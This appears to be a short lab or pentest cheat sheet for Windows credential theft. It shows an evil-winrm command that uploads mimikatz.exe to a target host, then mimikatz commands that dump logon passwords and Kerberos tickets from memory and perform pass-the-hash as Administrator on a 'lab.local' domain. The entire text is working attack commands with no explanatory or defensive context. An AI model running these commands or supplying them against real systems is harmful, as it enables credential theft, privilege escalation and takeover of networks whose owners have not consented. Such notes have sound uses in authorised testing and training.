
In evilwinRM

```
upload /path/to/mimikatz.exe C:\Users\Public\mimikatz.exe
```

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:<hash> /run:powershell.exe

